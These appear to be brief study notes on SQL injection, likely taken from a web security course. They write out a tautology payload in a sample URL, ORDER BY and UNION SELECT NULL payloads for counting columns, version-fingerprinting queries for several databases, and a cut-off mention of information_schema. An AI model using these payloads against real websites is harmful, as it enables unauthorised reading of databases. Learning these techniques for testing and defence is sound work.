1. https://insecure-website.com/products?category=Gifts'+OR+1=1--
 results into query
- SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
- The key thing here is that the double-dash sequence -- is a comment indicator in SQL, 
  and means that the rest of the query is interpreted as a commeny

2. Union Attacks
- For a UNION query to work, two key requirements must be met:
  The individual queries must return the same number of columns.
  The data types in each column must be compatible between the individual queries.
- Determining #columns
  Use ' ORDER BY 1-- until it results into error
    ' ORDER BY 2--
    ' ORDER BY 3--
     so on....
  Use ' UNION SELECT NULL-- until it gives no error
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    so on....

3. DB Versions

Microsoft, MySQL	SELECT @@version
Oracle	SELECT * FROM v$version
PostgreSQL	SELECT version()

4.
Most database types (with the notable exception of Oracle)have a set of views called 
the information schema which provide information about the database.
You can query information_schema.tables to list the tables in the database:
